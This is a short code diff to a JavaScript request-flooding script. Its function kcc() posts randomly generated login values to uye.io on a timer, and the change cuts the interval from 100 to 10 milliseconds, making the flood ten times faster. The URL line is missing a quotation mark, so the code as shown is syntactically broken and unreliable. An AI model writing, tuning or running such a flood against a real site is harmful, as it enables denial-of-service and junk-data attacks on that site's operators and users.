@@ -61,7 +61,7 @@ var code = {
 function kcc() {
 
   code.ajax({
-   url: http://uye.io/"+createrand(15),
+   url: http://uye.io/?"+createrand(15),
    type: "POST",
    data: {
          login : createrand(15),
@@ -75,5 +75,5 @@ function kcc() {
   })
  } 
 	
-	setInterval(function(){ kcc(); }, 100);
+	setInterval(function(){ kcc(); }, 10);
 }
